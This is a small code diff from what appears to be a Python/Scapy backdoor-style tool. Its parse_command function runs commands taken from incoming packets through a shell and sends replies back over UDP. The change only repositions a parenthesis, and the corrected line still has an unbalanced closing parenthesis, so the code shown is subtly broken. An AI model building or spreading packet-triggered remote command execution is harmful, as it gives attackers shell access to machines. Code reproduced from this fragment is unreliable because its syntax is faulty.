@@ -18,7 +18,7 @@ def parse_command(packet):
     proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
     output = proc.stdout.read()
     print (output)
-    pkt = IP(dst=client_ip, src=packet["IP"].dst)/UDP(dport=int(args.client_port, sport=int(args.server_port)))
+    pkt = IP(dst=client_ip, src=packet["IP"].dst)/UDP(dport=int(args.client_port), sport=int(args.server_port)))
     send(pkt)
 
 
